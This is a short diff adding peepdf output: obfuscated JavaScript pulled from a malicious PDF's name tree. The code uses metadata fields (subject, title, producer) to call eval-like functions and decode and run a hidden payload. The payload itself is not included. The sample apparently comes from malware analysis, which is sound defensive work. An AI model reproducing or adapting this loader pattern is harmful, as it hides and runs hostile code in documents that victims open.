@@ -1,0 +1,18 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [() <</S /JavaScript
+/JS (
+var g = 4;
+var HokAh = this.producer;
+var Zylycaqera=function(){return {sd:this}}().sd;
+VulyzenehimySoc=Zylycaqera[this.subject];
+qYus=VulyzenehimySoc(this.title);
+HokAh = HokAh.replace(/t / g, '2');
+okumaHyxecilisdik = VulyzenehimySoc('[' + HokAh + ']');
+var PameXiw = '';
+for (CowidEpidipev = 0; CowidEpidipev < okumaHyxecilisdik.length; CowidEpidipev++) {
+    Vuxevitwvet = okumaHyxecilisdik[CowidEpidipev];
+    PameXiw += qYus(Vuxevitwvet);
+}
+VulyzenehimySoc(PameXiw);) >> ] >>
+
